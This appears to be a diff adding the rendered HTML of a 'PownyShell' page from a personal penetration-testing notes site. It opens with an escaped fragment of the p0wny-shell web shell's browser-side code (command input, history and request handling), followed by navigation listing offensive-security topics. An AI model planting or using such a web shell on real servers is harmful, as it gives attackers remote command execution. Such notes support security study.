&#34;ArrowDown&#34;: if (historyPosition &gt;= commandHistory.length) { break; } historyPosition&#43;&#43;; if (historyPosition === commandHistory.length) { eShellCmdInput.value = &#34;&#34;; } else { eShellCmdInput.blur(); eShellCmdInput.focus(); eShellCmdInput.value = commandHistory[historyPosition]; } break; case &#39;Tab&#39;: event.preventDefault(); featureHint(); break; } } function insertToHistory(cmd) { commandHistory.push(cmd); historyPosition = commandHistory.length; } function makeRequest(url, params, callback) { function getQueryString() { var a = []; for (var key in params) { if (params.hasOwnProperty(key)) { a.push(encodeURIComponent(key) &#43; &#34;=&#34; &#43; encodeURIComponent(params[key])); } } return a.join(&#34;&amp;&#34;); } var xhr = new XMLHttpRequest(); xhr.open(&#34;POST&#34;, url, true); xhr.setRequestHeader(&#34;Content-Type&#34;, &#34;application/x-www-form-urlencoded&#34;); xhr.onreadystatechange = function() { if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) { try { var responseJson = JSON.parse(xhr.responseText); callback(responseJson); } catch (error) { alert(&#34;Error while parsing response: &#34; &#43; error); } } }; xhr.send(getQueryString()); } document.onclick = function(event) { event = event || window.event; var selection = window.getSelection(); var target = event.target || event.srcElement; if (target.tagName === &#34;SELECT&#34;) { return; } if (!selection.toString()) { eShellCmdInput.focus(); } }; window.onload = function() { eShellCmdInput = document.getElementById(&#34;shell-cmd&#34;); eShellContent = document.getElementById(&#34;shell-content&#34;); updateCwd(); eShellCmdInput.focus(); }; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&#34;shell&#34;&gt; &lt;pre id=&#34;shell-content&#34;&gt; &lt;div id=&#34;shell-logo&#34;&gt; ___ ____ _ _ _ _ _ &lt;span&gt;&lt;/span&gt; _ __ / _ \__ ___ __ _ _ / __ \ ___| |__ ___| | |_ /\/|| || |_ &lt;span&gt;&lt;/span&gt; | &#39;_ \| | | \ \ /\ / / &#39;_ \| | | |/ / _` / __| &#39;_ \ / _ \ | (_)/\/_ .. _|&lt;span&gt;&lt;/span&gt; | |_) | |_| |\ V V /| | | | |_| | | (_| \__ \ | | | __/ | |_ |_ _|&lt;span&gt;&lt;/span&gt; | .__/ \___/ \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_) |_||_| &lt;span&gt;&lt;/span&gt; |_| |___/ \____/ &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;/pre&gt; &lt;div id=&#34;shell-input&#34;&gt; &lt;label for=&#34;shell-cmd&#34; id=&#34;shell-prompt&#34; class=&#34;shell-prompt&#34;&gt;???&lt;/label&gt; &lt;div&gt; &lt;input id=&#34;shell-cmd&#34; name=&#34;cmd&#34; onkeydown=&#34;_onShellCmdKeyDown(event)&#34;/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/shell-and-payload/",
+       "name": "Reverse Shell",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "name": "Powny Shell",
+       "position": 4
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
